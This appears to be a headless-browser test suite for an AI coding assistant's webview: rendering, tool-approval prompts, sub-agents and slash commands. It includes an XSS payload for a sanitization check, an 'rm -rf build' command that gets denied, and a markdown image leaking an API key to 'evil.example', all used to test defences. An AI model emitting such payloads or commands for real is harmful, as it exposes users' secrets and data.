// Webview tests: the real UI bundle in headless Chrome, wired to a real tai --serve and the mock API.
import assert from "node:assert/strict";
import fs from "node:fs";
import path from "node:path";
import { fileURLToPath } from "node:url";
import { after, afterEach, before, describe, it } from "node:test";
import { Harness, launch, mock, startMock } from "./harness.mjs";

const SHOTS = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "screenshots");
const SHELL = process.platform === "win32" ? "powershell" : "bash";    // tai's shell tool on this OS
let browser, api;
const open = new Set();
afterEach(async () => {
  for (const h of open) await h.close().catch(() => {});
  open.clear();
});

before(async () => {
  api = await startMock();
  browser = await launch();
});
after(async () => {
  await browser?.close();
  api?.stop();
});

async function harness(opts = {}) {
  const h = new Harness(browser, api.url, opts);
  open.add(h);
  await h.open();
  await h.startTai(opts);
  return h;
}

async function done(h) {
  open.delete(h);
  await h.close();
  assert.deepEqual(h.errors, [], "browser errors");
}

describe("webview", { concurrency: false }, () => {
  it("shows the welcome screen and toolbar", async () => {
    for (const theme of ["dark", "light"]) {
      const h = await harness({ theme });
      await h.waitSel(".empty h2");
      assert.equal((await h.text("#modeBtn"))[0], "⏸ manual");
      assert.match((await h.text("#modelBtn"))[0], /gpt-5\.6-sol/);
      assert.equal(await h.page.$eval("#sendBtn", (b) => b.disabled), true);
      await h.shot(SHOTS, "01-welcome");
      await done(h);
    }
  });

  it("shows the Tilburg University emblem that suits the theme", async () => {
    for (const [theme, want] of [["dark", "logo-dark"], ["light", "logo-light"]]) {
      const h = await harness({ theme });
      await h.waitSel(".empty .logo");
      const shown = await h.page.$$eval(".empty .logo", (imgs) =>
        imgs.filter((i) => getComputedStyle(i).display !== "none")
          .map((i) => ({ cls: i.className, w: i.naturalWidth, box: i.getBoundingClientRect().width })));
      assert.equal(shown.length, 1, theme + ": exactly one logo visible");
      assert.match(shown[0].cls, new RegExp(want));
      assert.ok(shown[0].w > 0, "image loaded");
      assert.equal(shown[0].box, 64);
      await done(h);
    }
  });

  it("sends a message and renders the streamed answer", async () => {
    const h = await harness();
    await h.sendText("hello tai");
    await h.waitIdle();
    assert.deepEqual(await h.text(".msg.user .bubble"), ["hello tai"]);
    assert.deepEqual(await h.text(".msg.assistant .md"), ["Echo: hello tai"]);
    assert.equal(await h.page.$eval(".msg.user", (e) => e.dataset.index), "1");
    assert.match((await h.text(".stats"))[0], /in · .* out/);
    assert.equal(await h.page.$eval("#input", (i) => i.value), "");
    await done(h);
  });

  it("renders markdown, code blocks and clickable paths; sanitizes HTML", async () => {
    const h = await harness();
    fs.writeFileSync(path.join(h.ws, "a.py"), "print(1)\n");
    const md = "# Title\n\nSee `src/app.py:12` and [the file](a.py).\n\n- one\n- two\n\n```python\ndef f(x):\n    return x  # hi\n```\n\n" +
      "<img src=x onerror=\"window.__xss=1\"><script>window.__xss=2</script>\n\n| a | b |\n|---|---|\n| 1 | 2 |";
    await h.sendText(mock({ text: md, chunk_delay: 0.002 }));
    await h.waitIdle();
    await h.waitSel(".codeblock .hljs");
    assert.equal(await h.page.evaluate(() => window.__xss), undefined);
    assert.ok(await h.page.$(".msg.assistant h1"));
    assert.ok(await h.page.$(".msg.assistant table"));
    assert.ok(await h.page.$(".hljs-keyword"), "python is highlighted");
    await h.page.click(".msg.assistant code.path-link");
    const open = await h.waitFor((m) => m.type === "openFile");
    assert.deepEqual(open, { type: "openFile", path: "src/app.py", line: 12 });
    await h.page.click(".msg.assistant a");
    await h.waitFor((m) => m.type === "openFile" && m.path === "a.py");
    await h.page.click(".codebar button[title='Copy']");
    const copy = await h.waitFor((m) => m.type === "copy");
    assert.equal(copy.text, "def f(x):\n    return x  # hi\n");
    await h.shot(SHOTS, "02-markdown");
    await done(h);
  });

  it("asks for approval with a diff; key 1 approves and the edit shows as a diff", async () => {
    for (const theme of ["dark", "light"]) {
      const h = await harness({ theme });
      fs.writeFileSync(path.join(h.ws, "calc.py"), "def add(a, b):\n    return a - b\n\nprint(add(1, 2))\n");
      await h.sendText(mock({ text: "I'll fix the bug.", tools: [{ name: "edit_file", args: { path: "calc.py",
        old_string: "return a - b", new_string: "return a + b" } }] }, { text: "Fixed `calc.py:2`." }));
      await h.waitSel(".approval");
      assert.equal((await h.text(".approval-title"))[0], "Edit file");
      assert.deepEqual(await h.text(".approval .diff-row.del .tx"), ["-     return a - b"]);
      assert.deepEqual(await h.text(".approval .diff-row.add .tx"), ["+     return a + b"]);
      assert.equal(await h.page.$eval("#thinking", (t) => t.hidden), true, "indicator hidden while waiting");
      await h.shot(SHOTS, "03-approval");
      assert.equal(await h.page.evaluate(() => document.activeElement.classList.contains("approval")), true);
      await h.page.keyboard.press("1");
      await h.waitIdle();
      assert.equal(fs.readFileSync(path.join(h.ws, "calc.py"), "utf8").includes("a + b"), true);
      assert.equal(await h.page.$(".approval"), null);
      assert.match((await h.text(".tool.ok .tool-summary"))[0], /\+1 −1/);
      assert.ok(await h.page.$(".tool.open .diff"), "edit diff shown expanded");
      await h.shot(SHOTS, "04-edit-done");
      await done(h);
    }
  });

  it("denies with feedback (key 3, type, Enter)", async () => {
    const h = await harness();
    await h.sendText(mock({ tools: [{ name: SHELL, args: { command: "rm -rf build" } }] }, { text: "ok, not deleting" }));
    await h.waitSel(".approval pre.cmd");
    assert.equal((await h.text(".approval pre.cmd"))[0], "rm -rf build");
    await h.page.keyboard.press("3");
    await h.waitSel(".feedback:not([hidden]) input");
    await h.page.keyboard.type("keep the build folder");
    await h.page.keyboard.press("Enter");
    const a = await h.waitFor((m) => m.type === "approve");
    assert.equal(a.decision, "no");
    assert.equal(a.feedback, "keep the build folder");
    await h.waitIdle();
    assert.match((await h.text(".tool.failed .tool-summary"))[0], /Denied — keep the build folder/);
    await done(h);
  });

  it("'always' answers later approvals of the same kind", async () => {
    const h = await harness();
    const cmd = (c) => ({ name: SHELL, args: { command: c } });
    await h.sendText(mock({ tools: [cmd("echo one")] }, { tools: [cmd("echo two")] }, { text: "both ran" }));
    await h.waitSel(".approval");
    await h.page.click(".approval .opt:nth-child(2)");
    await h.waitIdle();
    assert.equal(h.toHost.filter((m) => m.type === "approve").length, 1);
    assert.equal((await h.page.$$(".tool.ok")).length, 2);
    await done(h);
  });

  it("shows sub-agents with their own tool calls", async () => {
    const h = await harness({ mode: "auto" });
    fs.writeFileSync(path.join(h.ws, "notes.md"), "# notes\n");
    const sub = (n) => mock({ delay: 0.3, tools: [{ name: "read_file", args: { path: "notes.md" } }] }, { text: `**Report ${n}**: all good` });
    await h.sendText(mock({ text: "Splitting this up.", tools: [
      { name: "task", args: { description: "check notes", prompt: sub(1) } },
      { name: "task", args: { description: "check again", prompt: sub(2) } }] }, { text: "Both reports are in." }));
    await h.waitIdle(20000);
    assert.equal((await h.page.$$(".task.ok")).length, 2);
    assert.equal((await h.page.$$(".task .task-body .tool.ok")).length, 2);
    assert.deepEqual(await h.text(".task-head .tool-arg"), ["check notes", "check again"]);
    await h.page.click(".task details summary");
    await h.shot(SHOTS, "05-subagents");
    await done(h);
  });

  it("shows the thinking indicator and Esc interrupts, keeping partial text", async () => {
    const h = await harness();
    await h.sendText(mock({ text: "partial words", hang: 30 }));
    await h.page.waitForFunction(() => document.querySelector(".msg.assistant")?.textContent.includes("partial"));
    assert.equal(await h.page.$eval("#thinking", (t) => t.hidden), false);
    await h.page.waitForFunction(() => /Responding…/.test(document.getElementById("thinking").textContent));
    assert.equal(await h.page.$eval("#sendBtn", (b) => b.classList.contains("stop")), true);
    await h.shot(SHOTS, "06-thinking");
    await h.page.focus("#input");
    await h.page.keyboard.press("Escape");
    await h.waitIdle();
    assert.match((await h.text(".notice.warning"))[0], /Interrupted/);
    assert.deepEqual(await h.text(".msg.assistant .md"), ["partial words"]);
    await done(h);
  });

  it("slash menu completes commands; /help and /btw work", async () => {
    const h = await harness();
    await h.sendText("first");
    await h.waitIdle();
    await h.type("/co");
    await h.waitSel("#menu:not([hidden]) .menu-item");
    assert.deepEqual(await h.text("#menu .menu-label"), ["/compact"]);
    await h.page.keyboard.press("Tab");
    assert.equal(await h.page.$eval("#input", (i) => i.value), "/compact ");
    await h.page.$eval("#input", (i) => { i.value = ""; i.dispatchEvent(new Event("input")); });
    await h.sendText("/help");
    await h.waitSel(".notice.info .md kbd, .notice.info .md code");
    await h.sendText("/btw what is 2+2?");
    await h.page.waitForFunction(() => document.querySelector(".btw .md")?.textContent.includes("2+2"));
    assert.equal(h.toHost.filter((m) => m.type === "send").length, 1, "/btw is not a normal message");
    await h.shot(SHOTS, "07-btw");
    await h.sendText("/nonsense");
    await h.waitSel(".notice.error");
    await done(h);
  });

  it("@ menu searches files and inserts a mention that gets attached", async () => {
    const h = await harness();
    fs.mkdirSync(path.join(h.ws, "src"));
    fs.writeFileSync(path.join(h.ws, "src", "model.py"), "x = 1\n");
    await h.type("look at @mod");
    await h.waitSel("#menu:not([hidden]) .menu-item");
    assert.ok((await h.text("#menu .menu-label")).includes("src/model.py"));
    await h.shot(SHOTS, "08-mention");
    await h.page.keyboard.press("Enter");
    assert.equal(await h.page.$eval("#input", (i) => i.value), "look at @src/model.py ");
    await h.page.keyboard.press("Enter");
    await h.waitIdle();
    assert.deepEqual(await h.text(".msg.user .chip span"), ["src/model.py"]);
    assert.match((await h.text(".msg.assistant .md"))[0], /x = 1[\s\S]*look at @src\/model.py/);
    await done(h);
  });

  it("queues a message while tai works and shows it where it was picked up", async () => {
    const h = await harness({ mode: "auto" });
    await h.sendText(mock({ delay: 0.8, tools: [{ name: "list_files", args: { pattern: "*" } }] }, { text: "first answer" }));
    await h.waitSel(".msg.user[data-index]");
    await h.sendText("second thought");
    await h.waitSel(".msg.user.queued");
    assert.match((await h.text(".queued-label"))[0], /queued/);
    await h.waitIdle(15000);
    const kinds = await h.page.$$eval("#messages > *", (els) => els.map((e) => e.className.split(" ").slice(0, 2).join(" ")));
    assert.ok(kinds.indexOf("msg user", 1) > kinds.indexOf("tool ok"), kinds.join(","));
    assert.equal((await h.text(".msg.assistant .md")).pop(), "Echo: second thought");
    await done(h);
  });

  it("an API error removes the message, restores the input, offers Retry", async () => {
    const h = await harness();
    const text = mock({ error: 500, message: "server on fire" });
    await h.sendText(text);
    await h.waitSel(".notice.error");
    await h.waitIdle();
    assert.match((await h.text(".notice.error"))[0], /server on fire/);
    assert.equal(await h.page.$(".msg.user"), null);
    assert.equal(await h.page.$eval("#input", (i) => i.value), text);
    assert.ok(await h.page.$(".notice.error .linkbtn"));
    await done(h);
  });

  it("Shift+Tab cycles the permission mode", async () => {
    const h = await harness();
    await h.page.focus("#input");
    await h.page.keyboard.down("Shift");
    await h.page.keyboard.press("Tab");
    await h.page.keyboard.up("Shift");
    await h.waitFor((m) => m.type === "setMode" && m.mode === "accept-edits");
    await h.page.waitForFunction(() => document.getElementById("modeBtn").textContent === "⏵ accept edits");
    await h.page.click("#modeBtn");
    await h.page.waitForFunction(() => document.getElementById("modeBtn").textContent === "⏵⏵ auto");
    await done(h);
  });

  it("context chip shows the selection and can be left out", async () => {
    const h = await harness();
    fs.writeFileSync(path.join(h.ws, "m.py"), "a\nb\nc\n");
    h.setContext({ path: path.join(h.ws, "m.py"), rel: "m.py", selection: { start: 2, end: 3, text: "b\nc" } });
    await h.waitSel("#chips .chip");
    assert.equal((await h.text("#chips .chip-text"))[0], "m.py:2-3");
    await h.sendText("what does this do?");
    await h.waitIdle();
    assert.equal(h.toHost.find((m) => m.type === "send").includeContext, true);
    assert.match((await h.text(".msg.assistant .md"))[0], /what does this do/);
    assert.deepEqual(await h.text(".msg.user .chip span"), ["m.py:2-3"]);
    await h.page.click("#chips .chip");
    assert.ok(await h.page.$("#chips .chip.off"));
    await h.sendText("and now?");
    await h.waitIdle();
    assert.equal(h.toHost.filter((m) => m.type === "send")[1].includeContext, false);
    await h.shot(SHOTS, "09-context");
    await done(h);
  });

  it("arrow up recalls earlier messages", async () => {
    const h = await harness();
    await h.sendText("one");
    await h.waitIdle();
    await h.sendText("two");
    await h.waitIdle();
    await h.page.focus("#input");
    await h.page.keyboard.press("ArrowUp");
    assert.equal(await h.page.$eval("#input", (i) => i.value), "two");
    await h.page.keyboard.press("ArrowUp");
    assert.equal(await h.page.$eval("#input", (i) => i.value), "one");
    await h.page.keyboard.press("ArrowDown");
    assert.equal(await h.page.$eval("#input", (i) => i.value), "two");
    await done(h);
  });

  it("renders a loaded transcript (tools, tasks, compact summary) and /clear empties it", async () => {
    const h = await harness({ mode: "auto" });
    fs.writeFileSync(path.join(h.ws, "x.txt"), "X\n");
    await h.sendText(mock({ tools: [{ name: "read_file", args: { path: "x.txt" } }] }, { text: "read" }));
    await h.waitIdle();
    const t = await h.client.call("transcript");
    h.post({ type: "transcript", items: t.transcript, state: t.state });
    await h.page.waitForFunction(() => document.querySelectorAll(".tool.ok").length === 1);
    assert.deepEqual(await h.text(".tool-label"), ["Read"]);
    await h.sendText("/compact");
    await h.waitSel(".summary-block");
    await h.waitIdle();
    await h.sendText("/clear");
    await h.waitSel(".empty");
    assert.equal(await h.page.$(".msg"), null);
    await done(h);
  });

  it("status banner appears and disappears (starting → ready → stopped → restart)", async () => {
    const h = await harness();
    const visible = () => h.page.$eval("#banner", (b) => getComputedStyle(b).display !== "none");
    await h.post({ type: "status", status: "starting" });
    await h.page.waitForFunction(() => document.getElementById("banner").textContent.includes("Starting"));
    assert.equal(await visible(), true);
    await h.post({ type: "status", status: "ready" });
    await h.page.waitForFunction(() => getComputedStyle(document.getElementById("banner")).display === "none");
    await h.post({ type: "status", status: "ready", needsKey: true });
    await h.page.waitForFunction(() => document.getElementById("banner").textContent.includes("API key"));
    await h.page.click("#banner .linkbtn");
    await h.waitFor((m) => m.type === "setApiKey");
    await h.post({ type: "status", status: "stopped", message: "tai stopped (exit code 1).", canRestart: true });
    await h.page.waitForFunction(() => document.getElementById("banner").textContent.includes("exit code 1"));
    assert.equal(await visible(), true);
    await h.page.click("#banner .linkbtn");
    await h.waitFor((m) => m.type === "restart");
    await h.post({ type: "status", status: "ready" });
    await h.page.waitForFunction(() => getComputedStyle(document.getElementById("banner")).display === "none");
    for (const sel of ["#menu", "#thinking", "#toast"]) {
      assert.equal(await h.page.$eval(sel, (e) => getComputedStyle(e).display), "none", sel + " hidden when idle");
    }
    await done(h);
  });

  it("Esc closes the @ menu without stopping tai", async () => {
    const h = await harness();
    await h.sendText(mock({ text: "working", hang: 30 }));
    await h.page.waitForFunction(() => document.querySelector(".msg.assistant")?.textContent.includes("working"));
    await h.type("look @");
    await h.waitSel("#menu:not([hidden])");
    await h.page.keyboard.press("Escape");
    await new Promise((r) => setTimeout(r, 300));
    assert.equal(h.toHost.filter((m) => m.type === "cancel").length, 0);
    assert.equal(await h.page.$eval("#thinking", (t) => t.hidden), false);
    await h.page.keyboard.press("Escape");
    await h.waitIdle();
    assert.equal(h.toHost.filter((m) => m.type === "cancel").length, 1, "one Esc, one cancel");
    await done(h);
  });

  it("does not load remote images from model output", async () => {
    const h = await harness();
    const reqs = [];
    h.page.on("request", (r) => reqs.push(r.url()));
    await h.sendText(mock({ text: "![secret](https://evil.example/leak?d=API_KEY) and <img src=\"https://evil.example/x.png\">" }));
    await h.waitIdle();
    assert.equal(await h.page.$(".msg.assistant img"), null);
    assert.match((await h.text(".msg.assistant a"))[0], /\[image: secret\]/);
    assert.ok(!reqs.some((u) => u.includes("evil.example")), reqs.join(","));
    await done(h);
  });

  it("a transcript loaded mid-turn keeps streaming into the same reply", async () => {
    const h = await harness();
    await h.sendText(mock({ text: "first half", hang: 2 }));
    await h.page.waitForFunction(() => document.querySelector(".msg.assistant")?.textContent.includes("first half"));
    const t = await h.client.call("transcript");
    h.post({ type: "transcript", items: t.transcript, state: t.state });
    await h.page.waitForFunction(() => document.querySelectorAll(".msg.assistant").length === 1 &&
      document.querySelector(".msg.assistant").textContent.includes("first half"));
    assert.equal(await h.page.$eval("#thinking", (x) => x.hidden), false);
    await h.waitIdle();
    assert.equal((await h.page.$$(".msg.assistant")).length, 1);
    await done(h);
  });

  it("streams a long answer without errors", async () => {
    const h = await harness();
    const long = Array.from({ length: 400 }, (_, i) => `Line ${i} with \`code\` and **bold** text.`).join("\n\n");
    const t = Date.now();
    await h.sendText(mock({ text: long }));
    await h.waitIdle(30000);
    assert.ok(Date.now() - t < 20000);
    assert.equal((await h.page.$$(".msg.assistant p")).length, 400);
    await done(h);
  });
});
